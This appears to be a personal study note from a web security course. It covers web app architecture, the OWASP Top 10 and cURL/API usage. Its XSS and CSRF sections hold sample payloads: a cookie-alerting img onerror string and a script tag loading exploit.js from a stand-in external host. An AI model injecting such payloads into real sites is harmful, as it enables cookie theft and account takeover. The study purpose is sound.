
# Web Application Layout

three main categories:
- Web Application Infrastructure: 
	-  `Client-Server`
	-  `One Server`
	-  `Many Servers - One Database`
	-  `Many Servers - Many Databases`
- Web Application Components: 
	1.  `Client`
	2.  `Server`
	    -   Webserver
	    -   Web Application Logic
	    -   Database
	3.  `Services`  (Microservices)
	    -   3rd Party Integrations
	    -   Web Application Integrations
	4.  `Functions`  (Serverless) 
- Web Application Architecture: three layers
	- Presentation Layer: frontend
	- Application Layer: backend
	- Data Layer: database
# [OWASP Top 10](https://owasp.org/www-project-top-ten/) vulnerabilities
1. Broken Access Control
2. Cryptographic Failures 
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)
# FrontEnd Vulnerabilities
## Cross-Site Scripting (XSS)
- **3 types**: `Reflected XSS`, `Stored XSS`, `DOM XSS`
```javascript
#"><img src=/ onerror=alert(document.cookie)>
```
## Cross-Site Request Forgery (CSRF)
- caused by unfiltered user input
- **common `CSRF` attack:** 
	- gain admin priv
	- craft a `JavaScript` payload that automatically changes the victim's password to the value set by the attacker.
	 
```html
"><script src=//www.example.com/exploit.js></script>
```
## Deobfuscation Websites

- [JS Console](https://jsconsole.com)
- [Prettier](https://prettier.io/playground/)
- [Beautifier](https://beautifier.io/)
- [JSNice](http://www.jsnice.org/)
# BackEnd Vulnerabilities
- Broken Auth/Access Control (Bypass login)
- Malicious File Upload
- Command Injection
- SQL Injection (SQLi)
- CVEs

# cURL
## curl
curl url					
- -o 												to save in a file 
- -s 												for silent mode
- -k 												skip the certificate check
- -v 												print both the request and response
- -I 												display response header
- -i 												display response header and body
- -A 												to set our User-Agent from header
- -u admin:admin url
- -H 'Authorization: Basic YWRtaW46YWRtaW4='
- -X POST -d 'username=admin&password=admin' 							-X for method and -d for data
- -L 												follow redirect link
- -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1'							set cookies
- post ex: curl -X POST -d '{"search":"f"}' -b 'PHPSESSID=9501nu5f74kqgohjh4ogu6debb' -H 'Content-Type: application/json' http://94.237.51.163:42040/search.php

- -s | jq											for good json structer
	
**Command** | **Description**
|--|--|
`curl -h` | cURL help menu
`curl inlanefreight.com` | Basic GET request
`curl -s -O inlanefreight.com/index.html` | Download file
`curl -k https://inlanefreight.com` | Skip HTTPS (SSL) certificate validation
`curl inlanefreight.com -v` | Print full HTTP request/response details
`curl -I https://www.inlanefreight.com` | Send HEAD request (only prints response headers)
`curl -i https://www.inlanefreight.com` | Print response headers and response body 
`curl https://www.inlanefreight.com -A 'Mozilla/5.0'` | Set User-Agent header
`curl -u admin:admin http://<SERVER_IP>:<PORT>/` | Set HTTP basic authorization credentials
`curl http://admin:admin@<SERVER_IP>:<PORT>/` | Pass HTTP basic authorization credentials in the URL
`curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/` | Set request header
`curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'` | Pass GET parameters
`curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/` | Send POST request with POST data
`curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/` | Set request cookies
`curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php` | Send POST request with JSON data

## APIs

**Command** | **Description**
|--|--|
`curl http://<SERVER_IP>:<PORT>/api.php/city/london` | Read entry
`curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq` | Read all entries
`curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'`|Create (add) entry
`curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Update (modify) entry
`curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City` | Delete entry

<!--stackedit_data:
eyJoaXN0b3J5IjpbMTIyMzEyNjExNiwtMTc0OTg4ODYxNSwxOT
Y1ODU2ODYyXX0=
-->